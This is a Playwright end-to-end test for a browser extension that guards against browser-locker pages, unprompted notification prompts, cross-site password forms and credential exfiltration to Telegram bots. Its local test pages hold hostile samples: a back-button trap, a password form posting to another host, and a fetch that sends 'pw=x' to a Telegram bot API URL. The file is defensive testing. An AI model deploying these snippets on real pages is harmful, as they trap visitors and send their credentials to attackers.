#!/usr/bin/env node
// ── tools/e2e-page-protections.mjs ───────────────────────────────────────────────
// Real-Chromium test (4.6.0) for the new page-level protections — behaviour only a browser shows:
//   protection 3 (blockDialogSpam, browser-locker): keyboard lock refused; fullscreen re-entry refused after the
//     user left fullscreen (video player excepted); "Leave site?" only after typing; back-button trap skipped
//     (to the previous website, or about:blank when there is none) — and nothing kept between pages;
//   blockNotificationPrompts: a prompt without a click is answered "default" and logged; with a click it is not;
//   warnPasswordForms: a password form to another site is held and the in-page dialog decides (Esc = nothing
//     sent, Continue = sent); a same-site form and a form without a password go straight through; form.submit()
//     is caught too;
//   blockExfilMessagingBots: a fetch to a Telegram bot from a page is blocked and the tab shows the red warning
//     with the channel; its "Go back" leaves the site (previous website, not the phishing site's own pages).
// Test hosts are mapped to a local server (--host-resolver-rules); levels, messages, protection keys and the
// channel come from the extension's own modules.
//
// Usage:  node e2e-page-protections.mjs --extension ../3P-Matrix [--chromium <path>]
// Exit:   0 = all pass · 1 = a case failed · 2 = did not run (C38)
// ─────────────────────────────────────────────────────────────────────────────

import { createServer } from "node:http";
import { existsSync } from "node:fs";
import { resolve, join } from "node:path";
import { pathToFileURL } from "node:url";

// ── Settings (one place) ─────────────────────────────────────────────────────
const EXIT = Object.freeze({ OK: 0, FAILED: 1, DID_NOT_RUN: 2 });
const LOCAL_ADDRESS = "127.0.0.1";
const HOST_A = "shop-a.test";                       // the page under test (registered domain shop-a.test)
const HOST_B = "collector-b.test";                  // "another site" (registered domain collector-b.test)
const HOST_PREV = "previous-c.test";                // the website visited before the page under test
const SW_SETTLE_MS = 1500;                          // first rule/script apply after install
const APPLY_SETTLE_MS = 1500;                       // a level/protection change re-registers scripts
const HOLD_CHECK_MS = 1500;                         // a held form must NOT have navigated within this time
const NAV_TIMEOUT_MS = 10000;
const PUSHED_ENTRIES = 5;                           // fake history entries the trap page adds without a click
const TELEGRAM_FETCH = "https://api.telegram.org/bot123:abc/sendMessage";   // a phishing kit's call (never sent)
const PASSWORD = "e2e-secret";
const LOG_MARK = "[3PMCF]";

function arg(name) { const i = process.argv.indexOf(`--${name}`); return i === -1 ? null : process.argv[i + 1]; }
function didNotRun(msg) { console.error(`e2e-page-protections: DID NOT RUN — ${msg}`); process.exit(EXIT.DID_NOT_RUN); }
function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

const ext = arg("extension");
if (!ext || !existsSync(join(ext, "manifest.json"))) didNotRun("missing or invalid --extension <folder>");
const EXT = resolve(ext);
let chromium, C, M, P, X;
try { ({ chromium } = await import("playwright")); } catch { didNotRun("the playwright package is not installed"); }
try {
  C = await import(pathToFileURL(join(EXT, "data/constants.js")).href);
  M = await import(pathToFileURL(join(EXT, "data/message-types.js")).href);
  P = await import(pathToFileURL(join(EXT, "data/protections.js")).href);
  X = await import(pathToFileURL(join(EXT, "data/exfil-channels.js")).href);
} catch (e) { didNotRun(`cannot import extension modules: ${e.message}`); }

// ── Test pages (one server, routed by path; built once the port is known) ──
function buildPages(port) {
  const other = (path) => `http://${HOST_B}:${port}${path}`;
  return Object.freeze({
  "/plain": "<!doctype html><title>plain</title><p>plain page",
  "/locker": `<!doctype html><title>locker</title>
    <input id="t"><button id="fs">fullscreen</button><div id="player"><video src="/clip.mp4"></video><button id="vfs">video fs</button></div>
    <script>
      document.getElementById("fs").onclick = () => document.documentElement.requestFullscreen().then(() => window.__fs = "in", (e) => window.__fs = e.message);
      document.getElementById("vfs").onclick = () => document.getElementById("player").requestFullscreen().then(() => window.__vfs = "in", (e) => window.__vfs = e.message);
    </script>`,
  "/leave": `<!doctype html><title>leave</title><input id="t"><button id="b">click</button>
    <script>window.onbeforeunload = () => "Changes you made may not be saved";</script>`,
  "/trap": `<!doctype html><title>trap</title><p>trap
    <script>for (let i = 0; i < ${PUSHED_ENTRIES}; i++) history.pushState({ i }, "", "#t" + i);
      addEventListener("popstate", () => history.pushState({}, "", "#again"));</script>`,
  // The page asks on load, by itself (no click) — page.evaluate() cannot test that: Playwright runs it as a click.
  "/notify": `<!doctype html><title>notify</title><button id="b">bell</button>
    <script>Notification.requestPermission().then((r) => window.__onLoad = r);
      document.getElementById("b").onclick = () => Notification.requestPermission().then((r) => window.__clicked = r);</script>`,
  "/form-other": `<!doctype html><title>login</title><form id="f" method="post" action="${other("/collect")}">
    <input name="u" value="me"><input id="pw" type="password" name="p"><button id="go">Sign in</button></form>`,
  "/form-same": `<!doctype html><title>login</title><form method="post" action="/done">
    <input id="pw" type="password" name="p"><button id="go">Sign in</button></form>`,
  "/form-nopw": `<!doctype html><title>search</title><form action="${other("/search")}"><input id="q" name="q"><button id="go">Search</button></form>`,
  "/form-programmatic": `<!doctype html><title>login</title><form id="f" method="post" action="${other("/collect")}">
    <input type="password" name="p" value="x"></form><button id="go">go</button>
    <script>document.getElementById("go").onclick = () => document.getElementById("f").submit();</script>`,
  "/exfil": `<!doctype html><title>exfil</title><button id="go">send</button>
    <script>document.getElementById("go").onclick = () => fetch(${JSON.stringify(TELEGRAM_FETCH)}, { method: "POST", body: "pw=x" }).catch(() => {});</script>`
  });
}
let PAGES = {};
const server = createServer((req, res) => {
  const path = req.url.split(/[?#]/)[0];
  res.writeHead(200, { "content-type": "text/html" });
  res.end(PAGES[path] || "<!doctype html><title>other</title><p>" + path);
});
await new Promise((r) => server.listen(0, LOCAL_ADDRESS, r));
const PORT = server.address().port;
PAGES = buildPages(PORT);
const url = (host, path) => `http://${host}:${PORT}${path}`;

let ctx = null, failed = 0;
function ok(name, cond, info) {
  if (!cond) failed++;
  console.log(`${cond ? "PASS" : "FAIL"} ${name}${cond ? "" : "  " + JSON.stringify(info)}`);
}

try {
  ctx = await chromium.launchPersistentContext("", {
    headless: false, executablePath: arg("chromium") || undefined,
    args: ["--headless=new", `--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`,
           `--host-resolver-rules=MAP ${HOST_A} ${LOCAL_ADDRESS}, MAP ${HOST_B} ${LOCAL_ADDRESS}, MAP ${HOST_PREV} ${LOCAL_ADDRESS}`,
           // Keyboard lock and notifications exist only in secure contexts; the local test server is plain HTTP.
           `--unsafely-treat-insecure-origin-as-secure=${[HOST_A, HOST_B, HOST_PREV].map((h) => url(h, "")).join(",")}`]
  });
  let [sw] = ctx.serviceWorkers();
  if (!sw) sw = await ctx.waitForEvent("serviceworker");
  const extId = new URL(sw.url()).host;
  await sleep(SW_SETTLE_MS);
  const ctl = await ctx.newPage(); await ctl.goto(`chrome-extension://${extId}/ui/options.html`);
  const send = (msg) => ctl.evaluate((m) => chrome.runtime.sendMessage(m), msg);
  // The ordinary site warning would interrupt these flows (test hosts score as unknown sites): off here.
  await send({ type: M.MSG_SET_PROTECTION, key: P.PROTECTION_KEY.WARN_SUSPICIOUS_SITES, enabled: false });
  await send({ type: M.MSG_SET_LEVEL, level: C.LEVEL.MEDIUM });
  await sleep(APPLY_SETTLE_MS);

  async function open(host, path) {
    const pg = await ctx.newPage();
    pg.logs = [];
    pg.on("console", (m) => pg.logs.push(m.text()));
    await pg.goto(url(host, path));
    return pg;
  }

  // ── Protection 3: keyboard lock ──
  let pg = await open(HOST_A, "/locker");
  const kl = await pg.evaluate(() => navigator.keyboard.lock().then(() => "locked", (e) => e.message));
  ok("browser-locker: keyboard lock refused by 3P Matrix", /3P Matrix/.test(kl), kl);

  // ── Protection 3: fullscreen re-entry ──
  await pg.click("#fs"); await pg.waitForFunction(() => window.__fs, null, { timeout: NAV_TIMEOUT_MS });
  const first = await pg.evaluate(() => window.__fs);
  await pg.evaluate(() => document.exitFullscreen());
  await pg.waitForFunction(() => !document.fullscreenElement);
  await pg.evaluate(() => { window.__fs = undefined; });
  await pg.click("#fs"); await pg.waitForFunction(() => window.__fs, null, { timeout: NAV_TIMEOUT_MS });
  const again = await pg.evaluate(() => window.__fs);
  ok("browser-locker: fullscreen allowed the first time", first === "in", first);
  ok("browser-locker: fullscreen re-entry after leaving it is refused", /3P Matrix/.test(again), again);
  await pg.click("#vfs"); await pg.waitForFunction(() => window.__vfs, null, { timeout: NAV_TIMEOUT_MS });
  ok("browser-locker: a video player may still go fullscreen", (await pg.evaluate(() => window.__vfs)) === "in", await pg.evaluate(() => window.__vfs));
  await pg.close();

  // ── Protection 3: "Leave site?" only after typing ──
  async function leavePrompted(type) {
    const p = await open(HOST_A, "/leave");
    await p.click("#b");                                                   // sticky activation, as on a scam page
    if (type) await p.type("#t", "unsaved");
    let prompted = false;
    p.on("dialog", (d) => { prompted = d.type() === "beforeunload"; d.accept().catch(() => {}); });
    await p.close({ runBeforeUnload: true });
    await sleep(APPLY_SETTLE_MS);
    return prompted;
  }
  // At level 3 protection 19 (blockRedirectsDialogs) sandboxes the page WITHOUT allow-modals, so Chrome itself
  // suppresses every "Leave site?" prompt there — switched off for these two cases to test protection 3 alone.
  await send({ type: M.MSG_SET_PROTECTION, key: P.PROTECTION_KEY.BLOCK_REDIRECTS_DIALOGS, enabled: false });
  await sleep(APPLY_SETTLE_MS);
  ok("browser-locker: no \"Leave site?\" when nothing was typed", !(await leavePrompted(false)));
  ok("browser-locker: \"Leave site?\" still shown after typing (unsaved changes)", await leavePrompted(true));
  await send({ type: M.MSG_SET_PROTECTION, key: P.PROTECTION_KEY.BLOCK_REDIRECTS_DIALOGS, enabled: true });
  await sleep(APPLY_SETTLE_MS);

  // ── Protection 3: back-button trap ──
  pg = await open(HOST_PREV, "/plain");
  await pg.goto(url(HOST_A, "/trap"));
  await pg.goBack().catch(() => {});
  await pg.waitForURL((u) => u.host.startsWith(HOST_PREV), { timeout: NAV_TIMEOUT_MS }).catch(() => {});
  ok("browser-locker: one Back press leaves the trap page to the previous website", new URL(pg.url()).host.startsWith(HOST_PREV), pg.url());
  await pg.close();
  pg = await open(HOST_A, "/trap");                                         // no earlier entry in this tab
  await pg.goBack().catch(() => {});
  await pg.waitForURL((u) => u.href === "about:blank", { timeout: NAV_TIMEOUT_MS }).catch(() => {});
  ok("browser-locker: trap with nothing before it → about:blank", pg.url() === "about:blank", pg.url());
  await pg.close();
  pg = await open(HOST_A, "/plain");
  await pg.evaluate(() => { history.pushState({}, "", "#a"); });
  await pg.goto(url(HOST_B, "/plain"));
  await pg.goBack();
  ok("browser-locker: nothing carried to the next page (normal Back works)", new URL(pg.url()).host.startsWith(HOST_A), pg.url());
  await pg.close();

  // ── Notification prompts without a click ──
  pg = await open(HOST_A, "/notify");
  await pg.waitForFunction(() => window.__onLoad, null, { timeout: NAV_TIMEOUT_MS }).catch(() => {});
  const noClick = await pg.evaluate(() => window.__onLoad);
  ok("notifications: a prompt without a click is answered \"default\" by 3P Matrix",
     noClick === "default" && pg.logs.some((t) => t.includes(LOG_MARK) && /notification prompt/.test(t)), { noClick, logs: pg.logs });
  const before = pg.logs.length;
  await pg.click("#b"); await sleep(APPLY_SETTLE_MS);
  ok("notifications: after a click the request is passed to Chrome", !pg.logs.slice(before).some((t) => /notification prompt/.test(t)), pg.logs.slice(before));
  await pg.close();

  // ── Password-form warning ──
  pg = await open(HOST_A, "/form-other");
  await pg.fill("#pw", PASSWORD);
  await pg.click("#go");
  await sleep(HOLD_CHECK_MS);
  ok("password form: to another site → held (not sent)", new URL(pg.url()).host.startsWith(HOST_A), pg.url());
  await pg.keyboard.press("Escape"); await sleep(HOLD_CHECK_MS);
  ok("password form: Esc closes the warning, nothing sent", new URL(pg.url()).host.startsWith(HOST_A), pg.url());
  await pg.click("#go"); await sleep(HOLD_CHECK_MS);
  await pg.keyboard.press("Tab"); await pg.keyboard.press("Enter");      // focus starts on Go back; Tab → Continue
  await pg.waitForURL((u) => u.host.startsWith(HOST_B), { timeout: NAV_TIMEOUT_MS }).catch(() => {});
  ok("password form: Continue sends it", new URL(pg.url()).host.startsWith(HOST_B), pg.url());
  await pg.close();
  pg = await open(HOST_A, "/form-same");
  await pg.fill("#pw", PASSWORD); await pg.click("#go");
  await pg.waitForURL((u) => u.pathname === "/done", { timeout: NAV_TIMEOUT_MS }).catch(() => {});
  ok("password form: same site → sent at once", new URL(pg.url()).pathname === "/done", pg.url());
  await pg.close();
  pg = await open(HOST_A, "/form-nopw");
  await pg.fill("#q", "x"); await pg.click("#go");
  await pg.waitForURL((u) => u.host.startsWith(HOST_B), { timeout: NAV_TIMEOUT_MS }).catch(() => {});
  ok("password form: a form without a password field is never touched", new URL(pg.url()).host.startsWith(HOST_B), pg.url());
  await pg.close();
  pg = await open(HOST_A, "/form-programmatic");
  await pg.click("#go"); await sleep(HOLD_CHECK_MS);
  ok("password form: form.submit() by a script is caught too", new URL(pg.url()).host.startsWith(HOST_A), pg.url());
  await pg.close();

  // ── Exfiltration to a messaging bot ──
  const [telegram] = X.EXFIL_CHANNELS.filter((c) => c.group === X.EXFIL_GROUP.MESSAGING_BOTS);
  pg = await open(HOST_PREV, "/plain");
  await pg.goto(url(HOST_A, "/exfil"));
  await pg.goto(url(HOST_A, "/exfil?step=2"));                              // a two-step kit: same site twice
  await pg.click("#go");
  await pg.waitForURL((u) => u.protocol === "chrome-extension:", { timeout: NAV_TIMEOUT_MS }).catch(() => {});
  const w = new URL(pg.url());
  ok("exfiltration: the tab shows the warning for the channel",
     w.pathname.endsWith(C.WARNING_PAGE.split("/").pop()) && w.searchParams.get(C.WARNING_REASON_PARAM) === telegram.id, pg.url());
  const signal = await pg.locator("#warnSignals li").first().textContent().catch(() => "");
  ok("exfiltration: the warning names the channel", signal.includes(telegram.label), signal);
  await pg.click("#btnBack");
  await pg.waitForURL((u) => u.host.startsWith(HOST_PREV), { timeout: NAV_TIMEOUT_MS * 2 }).catch(() => {});
  ok("exfiltration: Go back skips the phishing site's own pages", new URL(pg.url()).host.startsWith(HOST_PREV), pg.url());
  await pg.close();

  await send({ type: M.MSG_RESET_SETTINGS });
} catch (e) {
  didNotRun(e && e.message || String(e));
} finally {
  if (ctx) await ctx.close().catch(() => {});
  server.close();
}

console.log(failed ? `e2e-page-protections: ${failed} FAILED` : "e2e-page-protections: ALL PASS");
process.exit(failed ? EXIT.FAILED : EXIT.OK);
